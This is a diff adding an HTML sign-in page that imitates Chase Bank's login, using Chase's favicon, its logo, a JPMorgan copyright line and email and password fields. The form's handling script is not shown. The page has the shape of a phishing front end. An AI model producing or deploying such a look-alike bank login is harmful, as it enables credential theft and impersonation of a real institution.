@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chase Bank - Sign In</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+</head>
+<body class="chase-bg">
+  <header class="chase-header">
+    <img src="https://1000logos.net/wp-content/uploads/2017/06/Chase-logo.png" alt="Chase Logo" class="chase-logo">
+    <nav>
+      <a href="#">Personal</a>
+      <a href="#">Business</a>
+      <a href="#">Commercial</a>
+    </nav>
+  </header>
+  <main class="login-main">
+    <section class="login-card">
+      <h1>Sign in to Chase</h1>
+      <form id="loginForm">
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required placeholder="Email address">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required placeholder="Password">
+        <button type="submit" class="chase-btn">Sign In</button>
+        <div id="loginError" class="error-msg"></div>
+      </form>
+      <div class="login-links">
+        <a href="#">Forgot username/password?</a>
+        <a href="#">Open an account</a>
+      </div>
+    </section>
+  </main>
+  <footer class="chase-footer">
+    <p>&copy; 2025 JPMorgan Chase & Co.</p>
+  </footer>
+  <script src="script.js"></script>
+</body>
+</html> 
